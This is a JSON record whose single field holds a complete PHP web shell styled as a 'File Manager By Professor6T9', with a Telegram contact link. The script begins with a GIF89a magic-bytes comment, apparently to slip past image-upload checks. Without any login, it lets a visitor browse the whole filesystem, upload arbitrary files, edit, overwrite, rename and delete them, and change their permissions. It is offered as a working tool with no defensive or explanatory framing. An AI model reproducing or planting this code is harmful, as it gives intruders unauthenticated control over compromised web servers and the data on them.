{
  "result": "<?php\n/* GIF89a */\n\n$home = $_SERVER['HOME'] ?? '/';\n$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();\nif (!$path || !is_dir($path)) $path = getcwd();\n$uploadSuccess = false;\n$fileLink = '';\n$currentYear = date(\"Y\");\n$editContent = '';\n$editTarget = '';\n\nfunction h($str) { return htmlspecialchars($str, ENT_QUOTES); }\n\n// Handle Upload\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    if (isset($_FILES['upload'])) {\n        $dest = $path . '/' . basename($_FILES['upload']['name']);\n        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {\n            $uploadSuccess = true;\n            $fileLink = basename($dest);\n        }\n    } elseif (isset($_POST['chmod'], $_POST['file'])) {\n        chmod($path . '/' . $_POST['file'], intval($_POST['chmod'], 8));\n    } elseif (isset($_POST['savefile'], $_POST['filename'])) {\n        file_put_contents($path . '/' . $_POST['filename'], $_POST['savefile']);\n    } elseif (isset($_POST['rename'], $_POST['oldname'])) {\n        rename($path . '/' . $_POST['oldname'], $path . '/' . $_POST['rename']);\n    }\n}\n\n// Handle Edit\nif (isset($_GET['edit'])) {\n    $editTarget = basename($_GET['edit']);\n    $editPath = $path . '/' . $editTarget;\n    if (is_file($editPath)) {\n        $editContent = htmlspecialchars(file_get_contents($editPath));\n    }\n}\n\n// Handle Delete\nif (isset($_GET['delete'])) {\n    $target = $path . '/' . basename($_GET['delete']);\n    if (is_file($target)) {\n        unlink($target);\n        header(\"Location: ?path=\" . urlencode($path));\n        exit;\n    }\n}\n?>\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>📁</title>\n    <style>\n        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }\n        a { color: #6cf; text-decoration: none; }\n        a:hover { text-decoration: underline; }\n        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #1c1c1c; }\n        th, td { padding: 8px; border: 1px solid #333; text-align: left; }\n        th { background: #2a2a2a; }\n        input, button, textarea {\n            background: #222; color: #eee; border: 1px solid #444; padding: 5px;\n            border-radius: 4px; font-family: monospace;\n        }\n        button { background: #6cf; color: #000; font-weight: bold; cursor: pointer; }\n        .breadcrumb a { color: #ccc; margin-right: 5px; }\n        .breadcrumb span { color: #888; margin: 0 4px; }\n        .card { background: #1c1c1c; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px #000; margin-top: 20px; }\n        textarea { width: 100%; height: 300px; margin-top: 10px; }\n        footer { text-align: center; margin-top: 40px; color: #666; font-size: 0.9em; }\n    </style>\n    <?php if ($uploadSuccess): ?>\n    <script>alert(\"✅ File uploaded successfully!\");</script>\n    <?php endif; ?>\n</head>\n<body>\n\n<h2>📁 File Manager By Professor6T9</h2>\n\n<!-- Change Directory -->\n<form method=\"get\">\n    <label>📂 Change Directory:</label>\n    <input type=\"text\" name=\"path\" value=\"<?= h($path) ?>\" style=\"width:60%;\">\n    <button type=\"submit\">Go</button>\n</form>\n\n<!-- Breadcrumbs -->\n<div class=\"breadcrumb\">\n    <?php\n    $crumbs = explode('/', trim($path, '/'));\n    $accum = '';\n    echo '<a href=\"?path=/\">/</a>';\n    foreach ($crumbs as $crumb) {\n        $accum .= '/' . $crumb;\n        echo '<span>/</span><a href=\"?path=' . urlencode($accum) . '\">' . h($crumb) . '</a>';\n    }\n    echo '<span>/</span><a href=\"?path=' . urlencode($home) . '\">[ HOME ]</a>';\n    ?>\n</div>\n\n<!-- Parent Dir -->\n<?php if (dirname($path) !== $path): ?>\n<p><a href=\"?path=<?= urlencode(dirname($path)) ?>\">⬅️ [ PARENT DIR ]</a></p>\n<?php endif; ?>\n\n<!-- Upload -->\n<div class=\"card\">\n    <form method=\"post\" enctype=\"multipart/form-data\">\n        <input type=\"file\" name=\"upload\" required>\n        <button type=\"submit\">📤 Upload</button>\n    </form>\n    <?php if ($fileLink): ?>\n        <p><b>Link:</b> <a href=\"<?= h($fileLink) ?>\" target=\"_blank\"><?= h($fileLink) ?></a></p>\n    <?php endif; ?>\n</div>\n\n<!-- Edit File -->\n<?php if ($editTarget): ?>\n<div class=\"card\">\n    <form method=\"post\">\n        <input type=\"hidden\" name=\"filename\" value=\"<?= h($editTarget) ?>\">\n        <textarea name=\"savefile\"><?= $editContent ?></textarea><br>\n        <button type=\"submit\">💾 Save</button>\n    </form>\n</div>\n<?php endif; ?>\n\n<!-- File List -->\n<div class=\"card\">\n    <table>\n        <tr>\n            <th>Name</th><th>Size (kB)</th><th>Modified</th><th>Year</th><th>Perms</th><th>Actions</th>\n        </tr>\n        <?php\n        $items = scandir($path);\n        $dirs = $files = [];\n\n        foreach ($items as $item) {\n            if ($item === '.') continue;\n            if (is_dir($path . '/' . $item)) {\n                $dirs[] = $item;\n            } else {\n                $files[] = $item;\n            }\n        }\n\n        $all = array_merge($dirs, $files);\n\n        foreach ($all as $item) {\n            $full = $path . '/' . $item;\n            $isDir = is_dir($full);\n            $perm = substr(sprintf('%o', fileperms($full)), -4);\n            $mtime = filemtime($full);\n            $size = $isDir ? '-' : round(filesize($full) / 1024, 2);\n            $year = date(\"Y\", $mtime);\n            $date = date(\"Y-m-d H:i:s\", $mtime);\n\n            echo '<tr>';\n            echo '<td>';\n            echo $isDir ? '<a href=\"?path=' . urlencode($full) . '\">📁 ' . h($item) . '</a>' : '📄 ' . h($item);\n            echo '</td>';\n            echo \"$size</td><td>$date</td><td>$year</td>\";\n            echo '<td>\n                <form method=\"post\" style=\"display:inline;\">\n                    <input type=\"hidden\" name=\"file\" value=\"' . h($item) . '\">\n                    <input type=\"text\" name=\"chmod\" value=\"' . $perm . '\" size=\"4\">\n                    <button>Set</button>\n                </form>\n            </td>';\n            echo '<td>';\n            if (!$isDir) {\n                echo '<a href=\"?path=' . urlencode($path) . '&edit=' . urlencode($item) . '\">✏️ Edit</a> | ';\n                echo '<a href=\"?path=' . urlencode($path) . '&delete=' . urlencode($item) . '\" onclick=\"return confirm(\\'Delete?\\')\">🗑️</a> | ';\n                echo '<a href=\"' . h($item) . '\" download>⬇️</a> | ';\n                echo '<form method=\"post\" style=\"display:inline;\">\n                        <input type=\"hidden\" name=\"oldname\" value=\"' . h($item) . '\">\n                        <input type=\"text\" name=\"rename\" value=\"' . h($item) . '\" size=\"10\">\n                        <button>✏️</button>\n                    </form>';\n            } else {\n                echo '-';\n            }\n            echo '</td></tr>';\n        }\n        ?>\n    </table>\n</div>\n\n<footer>\n    © <?= $currentYear ?> | File Manager by <a href=\"http://t.me/Professor6T9\" target=\"_blank\">@Professor6T9</a>\n</footer>\n\n</body>\n</html>"
}
